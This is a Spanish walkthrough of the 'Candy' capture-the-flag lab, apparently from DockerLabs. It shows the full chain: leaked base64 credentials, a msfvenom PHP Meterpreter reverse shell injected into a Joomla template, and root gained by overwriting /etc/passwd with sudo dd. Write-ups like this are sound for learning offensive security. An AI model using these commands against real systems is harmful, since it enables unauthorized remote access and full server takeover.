# Candy

> Dificultad: Fácil

Antes que nada, en mi caso, decidí mapear el puerto 80 del contenedor de Docker al 9090 del
host par así poder acceder al servidor web gráficamente, sin complicaciones:  

[IMG]

La IP del contenedor de Candy es 172.18.0.2.  

Por otro lado, ya tengo mi contenedor atacante con Kali, preparado con IP 172.18.0.3:  

[IMG]    

### FASE RECOPILACIÓN / ENUMERACIÓN:
Con nmap descubrimos que hay un solo puerto habilitado escuchando con servicio. Es el 80,
una web app.  
En la sub-fase de Enumeracion Web, una de las cosas más básicas es buscar por el recurso
“robots.txt” el cual define qué directorios de la web-app no pueden encontrarse por
bots/agentes (navegadores, etc):  

En http://localhost:9090/robots.txt vemos:
Disallow: /un_caramelo admin:c2FubHVpczEyMzQ1  

Esto pareciera ser las credenciales de admin de la app.  

#### FASE EXPLOTACIÓN:
La password aparenta estar en formato base64, por lo tanto hay que descodificarla. He aquí
dos maneras:
1. Consultando a alguna IA
2.  echo “c2FubHVpczEyMzQ1” | base64 -d

[IMG]

Queda “admin:sanluis12345”
Las probamos y tenemos acceso:  

[IMG]  

#### FASE POST-EXPLOTACIÓN:
Revisando un poco, vamos haciendo fingerprinting de los activos. La mayoría son irrelevantes
para la escalada de privilegios:  

* grupo = 'Super Users'
* email = realmail@dockerlabs.com
* ID = 615
  
Encontramos que la versión de Joomla es 4.1.1 con un Manifest Data de 4.1.2. Esto podría ser
importante para buscar algún exploit con searchsploit, etc.  

Primero, probamos una técnica conocida para explotar Joomla. Es mediante sus plantillas.
Inyectando una web-shell en alguna de ellas en su index.php podría ser nuestro camino:  

* Vamos a Sistema —> Extesiones —> Admin Templates #chequear
* Ahora a “/administrator/templates/atum/index.php”  

[IMG de la Plantilla]  

Vemos que está bastante interesante, así que nos vamos a construir el web-shell con
msfvenom. En mi caso, lo hice con:
> msfvenom -p php/meterpreter/reverse_tcp LHOST=172.18.0.3 LPORT=6660 R -o web-
shell.php
> 
# cambiarlo por IMG  

> La R corresponde a “-f raw”. Significa un formato “en crudo”, el cual es necesario para archivos
PHP.
> 
Probamos, ahora sí, inyectar la web-shell en “/administrator/templates/atum/index.php” y
guardamos.  

[IMG Plantilla + WebShell]    

Una vez logrado, hay que probar si corre. Vamos a http://localhost:9090/administrator y vemos
que la página se queda cargando. Esto es indicativo de que la web-shell está funcionando. Bien, una vez está todo listo hay que preparar Meterpreter con los mismo datos que se usaron
para msfvenom:  
> 1- mfconsole  
> 2- use exploit/multi/handler  
> 3- set payload /php/meterpreter/reverse_tcp  
> 4- set lhost 172.18.0.3  
> 5- set lport 6660  
> 6- exploit (o run)  

[IMG]  

Una vez que el exploit está a la escucha hay que re-lanzar la webshell para lograr la conexión reversa con Meterpreter. He aquí 2 maneras:
> 1. Accediedo al navegador desde el host: 
http://localhost:9090/administrator (no hace falta ingresar credenciales)  
> 2. Usando curl desde Kali: curl http://172.18.0.3/administrator  

[IMG]  

Tenemos acceso.  

#### POST-EXPLOTACIÓN (elevar privilegios):
Una vez dentro con Meterpreter, se pueden hacer muchas cosas. Primero verificar usuario:
* getuid  

También podemos ejecutar shell:
* whoami
* id
* 
Nos da que somos www-data, usuario típico administrador del servidor web del sistema y por defecto sin privilegios, ni consola de login. Luego, enumeramos usuarios del sistema con:  
* cat /etc/passwd

[IMG]  

Obtenemos dos de relevancia:
> 1. luisillo
> 2. ubuntu

Ahora que tenemos por donde empezar a escalar privilegios, hay que pensar en buscar
credenciales dentro del sistema. Puesto que no hay un servidor SSH con el cual se pueda
pensar en realizar un ataque de diccionario (con rockyou.txt, etc), probamos buscarlas con
grep:
·
grep -RIi luisillo / 2>/dev/null
o /var/backups/hidden/otro_caramelo.txt:$db_user = 'luisillo';
o /var/backups/hidden/otro_caramelo.txt:$db_pass = 'luisillosuperpassword';
-R es para buscar recusivamente
–I para ignorar binarios
–i para ignorar los cases.
2>/dev/null envía la salida de errores estándar a /dev/null, es decir no la muestra, la descarta.
Obtenemos las credenciales luisillo:luisillosuperpasswordDesde www-data probamos:
·
shell —> su – luisillo —> Password = luisillosuperpassword
Logramos acceso.
Una vez como “luisillo”, probamos “sudo –l” y notamos que tenemos privilegios de superusuario
sin password para el binario “/bin/dd”. Usaremos eso.
Investigando un poco nos damos cuenta que con dd se pueden escribir archivos. Si lo usamos
con sudo escribiremos como root. Tteniendo en cuenta eso, podríamos pensar en escribir una
copia de /etc/passwd modificada a nuestros intereses y sobre-escribir el legítimo como root con
dd.
Primero creamos el hash para la password con openssl:
·
·
which openssl
openssl passwd
Tecleamos 1234 + Enter y nos devuelve un hash para la contraseña.
Copiamos /etc/passwd con:
·
cp /etc/passwd /tmp/passwd-malo
Una vez hecho, hacemos:
·
nano /tmp/passwd-malo
Borramos la “x” de root y la cambiamos por nuestro hash. Guardamos.
Ahora, la hora de la verdad. Probamos:
·
sudo /bin/dd if=/tmp/passwd-malo of=/etc/passwd
Vemos que no hay problema e intentamos:
·
·
su -
1234
Ya somos root.

  
